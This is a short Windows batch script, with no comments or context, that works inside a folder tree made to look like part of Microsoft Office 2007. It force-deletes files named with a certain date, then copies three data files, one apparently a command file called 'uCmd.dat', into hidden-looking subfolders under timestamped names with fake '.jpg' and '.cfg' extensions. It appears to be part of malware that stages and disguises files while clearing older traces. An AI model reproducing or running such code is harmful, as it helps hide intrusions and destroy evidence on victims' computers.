@echo off

set delOtherPath=C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\OFiles
FOR /f "tokens=*" %%a in ('dir /b "%delOtherPath%" ^| findstr /i /C:"26.12.2013"') do (
del /F /Q "%delOtherPath%\%%a"
)

set delScrPath=C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\OFiles\ScrFiles
FOR /f "tokens=*" %%b in ('dir /b "%delScrPath%" ^| findstr /i /C:"26.12.2013"') do (
del /F /Q "%delScrPath%\%%b"
)

set delWordPath=C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\WFiles
FOR /f "tokens=*" %%c in ('dir /b "%delWordPath%" ^| findstr /i /C:"26.12.2013"') do (
del /F /Q "%delWordPath%\%%c"
)

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\WinWordPath.dat" "%delOtherPath%\%dest%_WinWordPath.dat"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\AppSett.dat" "%delOtherPath%\%dest%_AppSett.dat"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\uCmd.dat" "%delOtherPath%\%dest%_uCmd.dat"


set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\WinWordPath.dat" "%delScrPath%\%dest%_WinWordPath.dat.jpg"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\AppSett.dat" "%delScrPath%\%dest%_AppSett.dat.jpg"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\uCmd.dat" "%delScrPath%\%dest%_uCmd.dat.jpg"

PING -n 3 127.0.0.1>nul

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\WinWordPath.dat" "%delOtherPath%\%dest%_WinWordPath.dat.cfg"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\AppSett.dat" "%delOtherPath%\%dest%_AppSett.dat.cfg"

set "dest=ee-%time:~0,2%-%time:~3,2%-%time:~6,2%"
copy "C:\Program Files\Microsoft Office\Office12\LAUNCHES\Service\uCmd.dat" "%delOtherPath%\%dest%_uCmd.dat.tmp.cfg"

exit
